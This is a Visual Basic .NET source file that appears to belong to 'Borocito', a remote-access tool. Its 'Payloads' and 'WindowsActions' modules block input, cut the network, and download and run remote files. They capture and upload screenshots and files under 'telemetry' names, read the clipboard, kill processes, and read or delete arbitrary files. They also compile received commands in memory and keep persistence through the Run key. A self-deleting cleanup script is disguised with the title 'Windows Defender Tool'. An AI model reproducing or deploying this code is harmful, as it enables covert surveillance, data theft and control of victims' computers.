Imports System.IO
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Net
Imports System.CodeDom
Imports System.Reflection
Module Payloads
    Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean
    Function Inputs(ByVal Status As Boolean) As String
        Try
            BlockInput(Status)
            AddToLog("Payloads", "Inputs (Mouse & Keyboard) (" & Status & ")", False)
            Return "[Inputs@Payloads]Input (Mouse & Keyboard) (" & Status & ")"
        Catch ex As Exception
            Return AddToLog("Inputs@Payloads", "Error: " & ex.Message, True)
        End Try
    End Function
    Sub DesconectarConexion()
        Try
            Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
            Dim ArgumentContent As String = "ipconfig /release"
            p.Arguments = ArgumentContent
            p.CreateNoWindow = True
            p.ErrorDialog = False
            p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
            System.Diagnostics.Process.Start(p)
            AddToLog("Payloads", "Internet down!", False)
        Catch ex As Exception
            AddToLog("DesconectarConexion@Payloads", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function SendTheKeys(ByVal proccess As String, ByVal content As String) As String
        Try
            If proccess.ToLower <> "null" Then
                Dim ProcID As Integer
                ProcID = Shell(proccess, AppWinStyle.NormalFocus)
                AppActivate(ProcID)
            End If
            For Each singleChar As Char In content
                My.Computer.Keyboard.SendKeys(singleChar, True)
            Next
            AddToLog("Payloads", "A text content was processed and showed", False)
            Return "[SendTheKeys@Payloads]A text content was processed And showed"
        Catch ex As Exception
            Return AddToLog("SendTheKeys@Payloads", "Error: " & ex.Message, True)
        End Try
    End Function
    Function DownloadComponent(ByVal URL As String, fileName As String, ByVal RunIt As Boolean, ByVal Args As String, Optional ByVal filePath As String = Nothing) As String 'WORKS! Last Check 03/05/2021 11:33PM
        Try
            filePath = filePath.Replace("%temp%", "C:\Users\" & Environment.UserName & "\AppData\Local\Temp")
            filePath = filePath.Replace("%localappdata%", "C:\Users\" & Environment.UserName & "\AppData\Local")
            filePath = filePath.Replace("%appdata%", "C:\Users\" & Environment.UserName & "\AppData\Roaming")
            If filePath = Nothing Or filePath.ToLower = "null" Then
                filePath = DIRCommons & "\Comps"
            End If
            If Args = Nothing Or Args.ToLower = "null" Then
                Args = Nothing
            End If
            Dim fileNamePath As String = filePath & "\" & fileName
            Try
                If Not My.Computer.FileSystem.DirectoryExists(filePath) Then
                    My.Computer.FileSystem.CreateDirectory(filePath)
                End If
            Catch
            End Try
            Try
                If My.Computer.FileSystem.FileExists(fileNamePath) Then
                    My.Computer.FileSystem.DeleteFile(fileNamePath)
                End If
            Catch
            End Try
            My.Computer.Network.DownloadFile(URL, fileNamePath)
            Threading.Thread.Sleep(50)
            If RunIt = True Then
                Process.Start(fileNamePath, Args)
            End If
            AddToLog("Payloads", "Component downloaded!", False)
            Return "[DownloadComponent@Payloads]Component downloaded!"
        Catch ex As Exception
            Return AddToLog("DownloadComponent@Payloads", "Error: " & ex.Message, True)
        End Try
    End Function
    Function uploadAfile(ByVal filePath As String, Optional ByVal serverUpload As String = Nothing) As String
        Try
            If serverUpload = Nothing Or serverUpload.ToLower = "null" Then
                Return Network.Telemetry.SendCustomTelemetryFile(filePath)
            Else
                Return Network.Telemetry.SendCustomTelemetryFile(filePath, serverUpload)
            End If
        Catch ex As Exception
            Return AddToLog("uploadAfile@Payloads", "Error: " & ex.Message, True)
        End Try
    End Function
    Function TakeAnScreenshot() As String
        Dim BF As New BinaryFormatter
        Dim IMAGEN As Bitmap
        Try
            Dim BM As Bitmap
            BM = New Bitmap(Screen.AllScreens.Sum(Function(s As Screen) s.Bounds.Width), Screen.AllScreens.Max(Function(s As Screen) s.Bounds.Height))
            Dim DIBUJO As Graphics
            DIBUJO = Graphics.FromImage(BM)
            DIBUJO.CopyFromScreen(SystemInformation.VirtualScreen.X, SystemInformation.VirtualScreen.Y, 0, 0, SystemInformation.VirtualScreen.Size)
            DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)
            IMAGEN = New Bitmap(BM)
            Dim DIBUJO2 As Graphics
            DIBUJO2 = Graphics.FromImage(IMAGEN)
            Dim MICURSOR As Cursor = Cursors.Hand
            Dim RECTANGULO As New Rectangle(Cursor.Position.X, Cursor.Position.Y, MICURSOR.Size.Width, MICURSOR.Size.Height)
            MICURSOR.Draw(DIBUJO2, RECTANGULO)
            Dim MS As New MemoryStream
            IMAGEN.Save(MS, Imaging.ImageFormat.Jpeg)
            IMAGEN = Image.FromStream(MS)
            Dim theFileName As String = "usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Screenshot.jpg"
            IMAGEN.Save(DIRCommons & "\" & theFileName, Imaging.ImageFormat.Jpeg)
            Threading.Thread.Sleep(100)
            Network.SendCustomTelemetryFile(DIRCommons & "\" & theFileName)
            AddToLog("Payloads", "Screenshot taken!", False)
            Return "[TakeAnScreenshot@Payloads]Screenshot taken!"
        Catch ex As Exception
            Return AddToLog("TakeAnScreenshot@Payloads", "Error: " & ex.Message, True)
        End Try
    End Function
    Function PostNotify(ByVal TipTimeOut As SByte, ByVal TipTitle As String, ByVal TipText As String, ByVal TipIcon As SByte, ByVal iconPath As String) As String
        Try
            Dim newNotify As New NotifyIcon
            newNotify.Visible = True
            If iconPath <> Nothing Then
                newNotify.Icon = Icon.ExtractAssociatedIcon(iconPath)
            End If
            Dim tipIcono As ToolTipIcon
            Select Case TipIcon
                Case 0
                    tipIcono = ToolTipIcon.None
                Case 1
                    tipIcono = ToolTipIcon.Info
                Case 2
                    tipIcono = ToolTipIcon.Warning
                Case 3
                    tipIcono = ToolTipIcon.Error
            End Select
            newNotify.ShowBalloonTip(TipTimeOut, TipTitle, TipText, tipIcono)
            newNotify.Visible = False
            AddToLog("Payloads", "Notify showed!", False)
            Return "[PostNotify@Payloads]Notify showed!"
        Catch ex As Exception
            Return AddToLog("PostNotify@Payloads", "Error: " & ex.Message, True)
        End Try
    End Function

    Sub Restart()
        Try
            AddToLog("Restart@Payloads", "Restarting....", True)
            Process.Start(DIRCommons & "\BorocitoUpdater.exe")
            Stopit()
        Catch ex As Exception
            AddToLog("Restart@Payloads", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub Uninstall()
        Try
            AddToLog("Uninstall@Payloads", "Uninstalling, goodbye!....", True)
            Dim uninstallFile As String = DIRTemp & "\UninstallerTool.cmd"
            If My.Computer.FileSystem.FileExists(uninstallFile) = True Then
                My.Computer.FileSystem.DeleteFile(uninstallFile)
            End If
            Dim Reg_BorocitoConfig As String = "reg delete " & """" & "HKEY_CURRENT_USER\SOFTWARE\Borocito" & """" & " /f" 'Borocito configuration
            Dim Reg_StartAsAdmin As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" & """" & " /v " & """" & Application.ExecutablePath & """" & " /f"
            Dim Reg_StartWithWindows As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" & """" & " /v " & """" & "Borocito" & """" & " /f"
            Dim File_StartWithWindows1 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe" & """"
            Dim File_StartWithWindows2 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk" & """"
            Dim File_StartWithWindows3 As String = "IF EXIST " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat" & """" & " DEL /F " & """" & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat" & """"
            Dim File_UpdaterTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroUpdater.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroUpdater.exe" & """"
            Dim File_ExtractorTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroExtractor.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroExtractor.exe" & """"
            Dim Dir_DIRCommons As String = "rmdir /q /s " & """" & DIRCommons & """"
            Dim FinalContent As String = "@echo off /c " & "title Windows Defender Tool" &
                vbCrLf & Reg_BorocitoConfig &
                vbCrLf & Reg_StartAsAdmin &
                vbCrLf & Reg_StartWithWindows &
                vbCrLf & File_StartWithWindows1 &
                vbCrLf & File_StartWithWindows2 &
                vbCrLf & File_StartWithWindows3 &
                vbCrLf & File_UpdaterTemp &
                vbCrLf & File_ExtractorTemp &
                vbCrLf & Dir_DIRCommons &
                vbCrLf & "start /b " & """" & """" & " cmd /c del " & """" & "%~f0" & """" & "&exit /b"
            If My.Computer.FileSystem.FileExists(uninstallFile) Then
                My.Computer.FileSystem.DeleteFile(uninstallFile)
            End If
            My.Computer.FileSystem.WriteAllText(uninstallFile, FinalContent, False, System.Text.Encoding.ASCII)
            AddToLog("SeeYou Protocol", "Shutting down... Goodbye, has been a pleasure! :,D ", True)
            Network.Telemetry.SendTelemetry()
            Process.Start(uninstallFile)
            Stopit()
        Catch ex As Exception
            AddToLog("Uninstall@Payloads", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub Update(Optional ByVal args As String = Nothing)
        Try
            AddToLog("Update@Payloads", "Starting Updater.exe...", True)
            Process.Start(DIRCommons & "\BorocitoUpdater.exe", args)
            'Stopit()
        Catch ex As Exception
            AddToLog("Update@Payloads", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub Extractor()
        Try
            AddToLog("Extractor@Payloads", "Starting Extractor.exe...", True)
            Process.Start(DIRCommons & "\BorocitoExtractor.exe")
            'Stopit()
        Catch ex As Exception
            AddToLog("Extractor@Payloads", "Error: " & ex.Message, True)
        End Try
    End Sub

    Function AnotherCommandProcessor(ByVal command As String) As String
        Try
            'AVISO: No declaro el procesador afuera porque quiero matarlo al finalizar el proceso.
            '   de esta forma se evita que el codigo quede andando de fondo. Quizas en un futuro el procesador
            '   quede andando de fondo, asi podra almacenar variables, etc.
            '   por ahora no, ya que sera asesinado al terminar esta funcion.
            Dim myProcessor As Assembly
            Dim mySupplier As New VBCodeProvider
            Dim myCompilador = mySupplier.CreateCompiler
            Dim myParam As New CodeDom.Compiler.CompilerParameters
            myParam.GenerateExecutable = False 'No quiero ejecutable
            myParam.GenerateInMemory = True 'Lo quiero en memoria
            'myParam.OutputAssembly = "" 'Por si quiero generar un simbolo
            'myParam.ReferencedAssemblies.Add("") 'No quiero referencias a a DLLs o librerias.
            Dim contenidoProcesador As String = My.Computer.FileSystem.ReadAllText(MyCommandProcessor)
            Dim myResult As Compiler.CompilerResults = myCompilador.CompileAssemblyFromSource(myParam, contenidoProcesador)
            myProcessor = myResult.CompiledAssembly

            'Creo la instancia de la clase
            Dim procesadorComandos = myProcessor.CreateInstance("BoroProcessor")

            'Uso la clase y llamo al metodo, luego devuelvo lo devuelto
            Dim valorDevuelto = procesadorComandos.Processor(command)
            If valorDevuelto <> Nothing Then
                Return valorDevuelto
            Else
                Return command & " processed with 'own' processor."
            End If
        Catch ex As Exception
            Return AddToLog("AnotherCommandProcessor@Payloads", "Error: " & ex.Message, True)
        End Try
    End Function
End Module
Module WindowsActions

    '<--- Process --->
    Function ProcessStart(ByVal execPath As String, ByVal argument As String) As String 'Funciona 29/03/2022 17:30
        Try
            If argument = Nothing Or argument.ToLower = "null" Then
                argument = Nothing
            End If
            Process.Start(execPath, argument)
            Return "[ProcessStart@WindowsActions]'" & IO.Path.GetFileName(execPath) & "' started with '" & argument & "' arguments."
        Catch ex As Exception
            Return AddToLog("ProcessStart@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
    Function ProcessStop(ByVal procName As String) As String 'Funciona 29/03/2022 17:30
        Try
            Dim proc = Process.GetProcessesByName(procName)
            For i As Integer = 0 To proc.Count - 1
                proc(i).Kill()
            Next i
            Return "[ProcessStop@WindowsActions]'" & procName & " (" & proc.Count & ")" & "' stopped."
        Catch ex As Exception
            Return AddToLog("ProcessStop@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
    Function ProcessGet(Optional ByVal procName As String = Nothing) As String 'Funciona 17/05/2022 00:04
        Try
            Dim retorno As String = Nothing
            retorno = vbCrLf
            If procName = Nothing Then
                Dim p As Process
                For Each p In Process.GetProcesses()
                    If Not p Is Nothing Then
                        retorno = retorno & p.ProcessName & " " & p.Id & vbCrLf
                    End If
                Next
            Else
                Dim proc = Process.GetProcessesByName(procName)
                If proc.Count > 0 Then
                    retorno = "True (" & proc.Count & ")"
                Else
                    retorno = "False"
                End If
                For Each proceso As Process In proc
                    retorno &= vbCrLf & "   ProcessName: " & proceso.ProcessName &
                        vbCrLf & "  Id: " & proceso.Id &
                        vbCrLf & "  MachineName: " & proceso.MachineName &
                        vbCrLf & "  MainWindowTitle: " & proceso.MainWindowTitle &
                        vbCrLf & "  Responding: " & proceso.Responding &
                        vbCrLf & "  StartTime: " & proceso.StartTime &
                        vbCrLf & "  BasePriority: " & proceso.BasePriority &
                        vbCrLf
                Next
            End If
            Return retorno
        Catch ex As Exception
            Return AddToLog("ProcessGet@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function

    '<--- FileSystem --->
    Function FileSystemGetDirectory(ByVal dirPath As String) As String 'Funciona 29/03/2022 17:30
        Try
            Dim retorno As String = Nothing
            retorno = vbCrLf
            For Each DIR As String In My.Computer.FileSystem.GetDirectories(dirPath, FileIO.SearchOption.SearchAllSubDirectories)
                retorno = retorno & DIR & vbCrLf
            Next
            Return retorno
        Catch ex As Exception
            Return AddToLog("FileSystemGetDirectory@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
    Function FileSystemGetFiles(ByVal dirPath As String) As String 'Funciona 29/03/2022 17:30
        Try
            Dim retorno As String = Nothing
            retorno = vbCrLf
            For Each FILE As String In My.Computer.FileSystem.GetFiles(dirPath, FileIO.SearchOption.SearchAllSubDirectories)
                retorno = retorno & FILE & vbCrLf
            Next
            Return retorno
        Catch ex As Exception
            Return AddToLog("FileSystemGetFiles@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
    Function FileSystemRead(ByVal filePath As String) As String 'Funciona 29/03/2022 17:30
        Try
            Dim retorno As String = Nothing
            retorno = vbCrLf
            retorno &= My.Computer.FileSystem.ReadAllText(filePath)
            Return retorno
        Catch ex As Exception
            Return AddToLog("FileSystemRead@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
    Function FileSystemWrite(ByVal filePath As String, ByVal content As String, Optional ByVal append As Boolean = False) As String 'Funciona 29/03/2022 17:30
        Try
            My.Computer.FileSystem.WriteAllText(filePath, content, append)
            Return "[FileSystemWrite@WindowsActions]Writted in '" & IO.Path.GetFileName(filePath) & "'."
        Catch ex As Exception
            Return AddToLog("FileSystemWrite@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
    Function FileSystemDirCreate(ByVal dirPath As String) As String 'Funciona 29/03/2022 17:30
        Try
            My.Computer.FileSystem.CreateDirectory(dirPath)
            Return "[FileSystemDirCreate@WindowsActions]Directory '" & IO.Path.GetDirectoryName(dirPath) & "' created."
        Catch ex As Exception
            Return AddToLog("FileSystemDirCreate@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
    Function FileSystemDelete(ByVal objectPath As String) As String 'Funciona 29/03/2022 17:30
        Try
            Try
                My.Computer.FileSystem.DeleteFile(objectPath)
                Return "[FileSystemDelete@WindowsActions]File deleted!"
            Catch
            End Try
            Try
                My.Computer.FileSystem.DeleteDirectory(objectPath, FileIO.DeleteDirectoryOption.DeleteAllContents)
                Return "[FileSystemDelete@WindowsActions]Directory deleted!"
            Catch
            End Try
            Return "[FileSystemDelete@WindowsActions]Can't delete"
        Catch ex As Exception
            Return AddToLog("FileSystemDelete@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function

    '<--- Clipboard --->
    Function ClipboardSet(ByVal text As String) As String
        Try
            My.Computer.Clipboard.SetText(text)
            Return "[ClipboardSet@WindowsActions]Clipboard set."
        Catch ex As Exception
            Return AddToLog("ClipboardSet@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
    Function ClipboardGet() As String
        Try
            Dim retorno As String = Nothing
            retorno = vbCrLf
            retorno &= My.Computer.Clipboard.GetText()
            Return retorno
        Catch ex As Exception
            Return AddToLog("ClipboardGet@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function

    '<--- System --->
    Function SystemGetHost() As String 'Funciona 29/03/2022 17:30
        Try
            Dim retorno As String = Nothing
            retorno = vbCrLf
            Dim MI_HOST As String
            MI_HOST = Dns.GetHostName()
            Dim MIS_IP As IPAddress() = Dns.GetHostAddresses(MI_HOST)
            retorno = retorno & MI_HOST & vbCrLf
            For I = 0 To MIS_IP.Length - 1
                retorno = retorno & MIS_IP(I).ToString & vbCrLf
            Next
            Return retorno
        Catch ex As Exception
            Return AddToLog("SystemGetHost@WindowsActions", "Error: " & ex.Message, True)
        End Try
    End Function
End Module
